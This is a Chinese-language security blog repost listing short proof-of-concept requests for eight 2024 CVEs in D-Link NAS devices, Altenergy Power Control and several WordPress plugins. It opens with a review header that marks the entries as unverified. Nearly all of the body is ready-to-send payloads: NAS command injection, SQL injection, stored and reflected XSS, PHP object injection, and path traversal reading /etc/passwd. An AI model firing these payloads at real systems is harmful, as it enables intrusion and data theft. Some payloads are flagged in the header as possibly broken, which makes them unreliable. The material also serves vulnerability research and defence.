---
cve: "CVE-2024-10914"
product: "D-Link NAS；Altenergy Power Control；WordPress multiple plugins"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2024-10914; CVE-2024-11305; CVE-2024-10793; CVE-2024-11199; CVE-2024-11381; CVE-2024-43919; CVE-2024-52433; CVE-2024-9935"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "2024 年 wordpress、d-link 等相关的多个 cve 漏洞 poc"
prerequisites: "来源所述条件，未列明部分仍待核：各产品/插件分别；shortcode需可编辑内容角色，PHP对象注入需加载目标类/POP，NAS/工控配置未述"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/Pj3X-PpW6qH-EZF01ugZ1w"
id: "vw-da6a38b938ed29856ee2de23"
entity_id: "ve-da6a38b938ed29856ee2de23"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：各产品/插件分别；shortcode需可编辑内容角色，PHP对象注入需加载目标类/POP，NAS/工控配置未述

- **事实待核（1）**：WordPress目录收NAS和能源软件，frontmatter只D-Link首CVE，需拆八实体而非强归WP。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（2）**：10914/11305把日期当版本上界，缺真实固件/发行范围。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **凭据与会话边界（3）**：Altenergy SQL载荷相邻CHAR函数无连接运算，需核实际方言；audit-log AJAX未Cookie/nonce权限未解释。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **事实待核（4）**：两个shortcode没插件名字/版本；MyGeoPosts假想PHP_Object_Injection类不是目标gadget证据；Elementor页面固定ID84。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **来源与引用处置（5）**：所有条目无来源/响应/修复，广告占后半，状态应未验证线索。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 2024 年 wordpress、d-link 等相关的多个 cve 漏洞 poc

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Pj3X-PpW6qH-EZF01ugZ1w)

![](https://mmbiz.qpic.cn/mmbiz_gif/1mtwZURvGTkCK3ZFyqYEyTwmaLo2YSMeibz3eeShkewiadS4oh0RBl1U7BTVeEscGQrEbjWKcQzGpJEFLwr4cFQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

⚠️ 漏洞
-----

### ✅ CVE-2024-10914

**在 D-Link DNS-320、DNS-320LW、DNS-325 和 DNS-340L 中发现的漏洞，版本直到 20241028**

```
GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27 HTTP/1.1


```

### ✅ CVE-2024-11305

**在 Altenergy Power Control Software 中发现的关键漏洞，版本直到 20241108**

```
POST /index.php/display/status_zigbee HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

date=2024-11-06%' UNION ALL SELECT 11,CHAR(113)CHAR(75,101,86,69,115,83,113,89,100,122,121,102,83,83,113,86,84,112,100,103,69,75,80,117,88,109,83,105,89,116,110,120,76,84,73,109,115,100,83,107)CHAR(113,118,98,98,113),11-- wPIB


```

### ✅ CVE-2024-10793

**WP Security Audit Log 插件检测 一个允许注入恶意脚本的 XSS 漏洞。.**

```
curl -X POST 'http://example.com/wp-admin/admin-ajax.php' \
     -d 'action=destroy-sessions&user_id=<script>alert("XSS found windz3r0day")</script>'


```

### ✅ CVE-2024-11199

**通过插件的 rescue_progressbar 短代码进行的存储跨站脚本攻击**

```
[rescue_progressbar visibility='foo" onclick="alert(/XSS/)"']


```

### ✅ CVE-2024-11381

**通过插件的 ch_registro 短代码进行的存储跨站脚本攻击**

```
[ch_registro note='"onmouseover="alert(/XSS/)"']


```

### ✅ CVE-2024-43919

**YARPP <= 5.30.10 - 缺少授权

该漏洞允许未经授权访问以修改展示类型。.

```
GET /wp-content/plugins/yet-another-related-posts-plugin/includes/yarpp_pro_set_display_types.php?ypsdt=false&types[]=post&types[]=page HTTP/1.1
Host: example.com


```

### ✅ CVE-2024-52433

**My Geo Posts Free <= 1.2 - 未经认证的 PHP 对象注入**

```
GET / HTTP/2
Host: wp-dev.ddev.site
Cookie: mgpf_geo_coockie=TzoyMDoiUEhQX09iamVjdF9JbmplY3Rpb24iOjA6e30=


```

### ✅ CVE-2024-9935

**Elementor 页面构建器的 PDF 生成插件 <= 1.7.5 - 未经认证的任意文件下载**

```
GET /elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Priority: u=0, i


```

▶▶▶ 免责声明
--------

仅用于教育目的。在未获得明确许可的情况下对系统或网站使用这些漏洞是非法的。作者对任何使用这些信息所产生的后果不负责任。

![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/2_02.png) 广告
------------------------------------------------------------------------------------

全网最强大的网络安全资源大全：[棉花糖会员站介绍 (24 年 10 月 4 日版本)](http://mp.weixin.qq.com/s?__biz=MzkyOTQzNjIwNw==&mid=2247489356&idx=1&sn=b748fb12a8220965758983ddc05baaad&chksm=c208d00cf57f591aaca9a8c2a8507f9ec6fa07457598007a61c93e425b5248bc5a4d0e8b6e70&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/lic4LrsB27ntZqXOIfzTDcpXR1rrYALUMbiahn8ibv3KD3tZaNPwo9VpqicdkHwQ7RfXiaUkmzABwibVL5Hicia6zQ99Ww/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lic4LrsB27ntZqXOIfzTDcpXR1rrYALUMbtqkusQicwPaib5r171YAyMBSd9OTbJxvLcdszqH77K5G9j9uiaibuLib6w/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lic4LrsB27ntZqXOIfzTDcpXR1rrYALUMeXmDyAEswoxDMPdicGKeYZ3pY7DxG6A4aOvLC2VRJqPdLV0VFdyTYNw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/lic4LrsB27ntZqXOIfzTDcpXR1rrYALUM373ibicylzZDjBCAKKKMxXbzRSSBsyTgQQK9dOlgmJQna0O41RjvsQgQ/640?wx_fmt=png&from=appmsg)

**☟上下滑动查看更多**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
